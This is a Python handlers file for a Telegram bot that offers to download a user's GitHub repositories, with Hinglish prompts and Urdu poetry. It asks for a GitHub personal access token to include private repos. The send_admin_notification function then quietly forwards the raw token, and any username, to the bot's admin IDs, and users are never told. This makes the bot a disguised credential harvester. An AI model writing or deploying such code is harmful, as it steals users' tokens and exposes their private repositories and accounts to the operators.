"""
Bot handlers for TSunGitHubBot
Contains all command handlers and message processors
"""

import asyncio
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from github_service import GitHubService
from database import Database
from utils import get_random_poetry, validate_pat, format_admin_notification
from config import *

logger = logging.getLogger(__name__)

# Initialize services
db = Database()
github_service = GitHubService()

# Global user states
user_states = {}

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    chat_id = update.effective_chat.id
    
    try:
        # Save user to database
        await db.add_user(user.id, chat_id, user.username or "Unknown")
        
        # Create inline keyboard
        keyboard = [
            [InlineKeyboardButton("👤 GitHub Username se Continue karein", callback_data="auth_username")],
            [InlineKeyboardButton("🔑 GitHub Personal Access Token se Continue karein", callback_data="auth_pat")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            WELCOME_MESSAGE,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        
        logger.info(f"User {user.id} started the bot")
        
    except Exception as e:
        logger.error(f"Error in start_handler: {e}")
        await update.message.reply_text(ERROR_MESSAGES['general_error'])

async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    await update.message.reply_text(
        HELP_MESSAGE,
        parse_mode=ParseMode.MARKDOWN
    )

async def about_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /about command"""
    await update.message.reply_text(
        ABOUT_MESSAGE,
        parse_mode=ParseMode.MARKDOWN
    )

async def quotes_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /quotes command"""
    from scheduler import send_quote_to_user
    
    try:
        await send_quote_to_user(context.bot, update.effective_chat.id)
        logger.info(f"Quote sent to user {update.effective_user.id}")
    except Exception as e:
        logger.error(f"Error sending quote: {e}")
        await update.message.reply_text(
            "❌ *Quote nahi mil saka!* 😔\nThoda baad try karein.",
            parse_mode=ParseMode.MARKDOWN
        )

async def cancel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cancel command"""
    user_id = update.effective_user.id
    
    if user_id in user_states:
        del user_states[user_id]
        await update.message.reply_text(
            "✅ *Operation cancelled!* 🚫\n\n_\"Ruk jana bhi ek raah hai\"_ 🌙\n— Jaun Elia",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await update.message.reply_text(
            "🤷‍♂️ *Koi operation running nahi hai!*\n\nUse `/start` to begin! 🚀",
            parse_mode=ParseMode.MARKDOWN
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button presses"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "auth_username":
        user_states[user_id] = USER_STATES['WAITING_USERNAME']
        await query.edit_message_text(
            "👤 *GitHub Username Input* 📝\n\nAapka GitHub username enter karein:\n\n_Example: octocat_",
            parse_mode=ParseMode.MARKDOWN
        )
        
    elif query.data == "auth_pat":
        user_states[user_id] = USER_STATES['WAITING_PAT']
        await query.edit_message_text(
            "🔑 *Personal Access Token Input* 🔐\n\nAapka GitHub PAT enter karein:\n\n"
            "⚠️ *Security Note:* Token `ghp_` se start hona chahiye\n"
            "📚 *Help:* GitHub Settings → Developer settings → Personal access tokens",
            parse_mode=ParseMode.MARKDOWN
        )

async def github_input_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle GitHub username or PAT input"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_states:
        return
    
    state = user_states[user_id]
    
    if state == USER_STATES['WAITING_USERNAME']:
        await handle_username_input(update, context, text)
    elif state == USER_STATES['WAITING_PAT']:
        await handle_pat_input(update, context, text)

async def handle_username_input(update: Update, context: ContextTypes.DEFAULT_TYPE, username: str):
    """Handle GitHub username input"""
    user_id = update.effective_user.id
    user_states[user_id] = USER_STATES['PROCESSING']
    
    try:
        # Send admin notification
        await send_admin_notification(context.bot, update.effective_user, "Username", username)
        
        # Start processing
        processing_msg = await update.message.reply_text(
            "🔄 *Processing shuru ho gayi!* 🚀\n\n"
            "⏳ GitHub se repos fetch kar raha hun...",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Process repositories
        download_link = await github_service.process_user_repos(
            username=username,
            user_id=user_id,
            update_callback=lambda msg: update_progress_message(context.bot, processing_msg, msg)
        )
        
        if download_link:
            # Clean up state
            del user_states[user_id]
            
            # Send success message with poetry
            poetry = get_random_poetry()
            await processing_msg.edit_text(
                f"🎉 *Repositories successfully processed!* 📦\n\n"
                f"🔗 *Download Link:* [Click here]({download_link})\n\n"
                f"_\"{poetry['text']}\"_\n— {poetry['author']} ✨\n\n"
                f"〆༯𝙎คAEED✘🫀",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            del user_states[user_id]
            await processing_msg.edit_text(ERROR_MESSAGES['general_error'])
            
    except Exception as e:
        logger.error(f"Error processing username: {e}")
        if user_id in user_states:
            del user_states[user_id]
        await update.message.reply_text(ERROR_MESSAGES['general_error'])

async def handle_pat_input(update: Update, context: ContextTypes.DEFAULT_TYPE, pat: str):
    """Handle GitHub PAT input"""
    user_id = update.effective_user.id
    
    if not validate_pat(pat):
        await update.message.reply_text(
            ERROR_MESSAGES['invalid_pat'],
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    user_states[user_id] = USER_STATES['PROCESSING']
    
    try:
        # Send admin notification
        await send_admin_notification(context.bot, update.effective_user, "PAT", pat)
        
        # Start processing
        processing_msg = await update.message.reply_text(
            "🔄 *Processing shuru ho gayi!* 🚀\n\n"
            "⏳ GitHub se repos fetch kar raha hun...\n"
            "🔑 PAT se private repos bhi include honge!",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Process repositories
        download_link = await github_service.process_user_repos(
            pat=pat,
            user_id=user_id,
            update_callback=lambda msg: update_progress_message(context.bot, processing_msg, msg)
        )
        
        if download_link:
            # Clean up state
            del user_states[user_id]
            
            # Send success message with poetry
            poetry = get_random_poetry()
            await processing_msg.edit_text(
                f"🎉 *Repositories successfully processed!* 📦\n\n"
                f"🔗 *Download Link:* [Click here]({download_link})\n\n"
                f"_\"{poetry['text']}\"_\n— {poetry['author']} ✨\n\n"
                f"〆༯𝙎คAEED✘🫀",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            del user_states[user_id]
            await processing_msg.edit_text(ERROR_MESSAGES['general_error'])
            
    except Exception as e:
        logger.error(f"Error processing PAT: {e}")
        if user_id in user_states:
            del user_states[user_id]
        await update.message.reply_text(ERROR_MESSAGES['general_error'])

async def send_admin_notification(bot, user, cred_type, credential):
    """Send notification to admin users"""
    notification_text = format_admin_notification(user, cred_type, credential)
    
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=notification_text,
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            logger.error(f"Failed to send admin notification to {admin_id}: {e}")

async def update_progress_message(bot, message, progress_text):
    """Update progress message"""
    try:
        await message.edit_text(
            progress_text,
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.error(f"Failed to update progress message: {e}")
